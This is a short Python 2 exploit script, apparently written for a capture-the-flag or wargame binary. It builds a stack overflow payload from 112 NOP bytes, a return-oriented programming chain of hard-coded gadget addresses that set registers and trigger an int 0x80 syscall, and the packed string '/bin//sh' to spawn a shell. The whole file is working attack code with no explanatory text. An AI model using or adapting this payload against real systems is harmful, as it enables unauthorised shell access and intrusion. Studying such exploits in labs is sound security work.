from struct import pack

addr_binsh = '\xf4\x7e\xfe\xbf'

ebp = '\xc8\x7e\xfe\xbf'

gad_edx = '\xcb\xe7\x08\x08' + "A"*8
gad_eax = '\xac\xb2\x0b\x08' + '\x82\xc7\x07\x08' + "A"*4
gad_ecx = '\x61\x73\x05\x08' + '\xfc\x7e\xfe\xbf' + addr_binsh

gad_int = '\xe0\x7a\x05\x08'

str_ = gad_edx + gad_eax + gad_ecx + gad_int 
binsh = pack('<I',0x6e69622f)+pack('<I',0x68732f2f)

print 112 * '\x90' + str_ + binsh
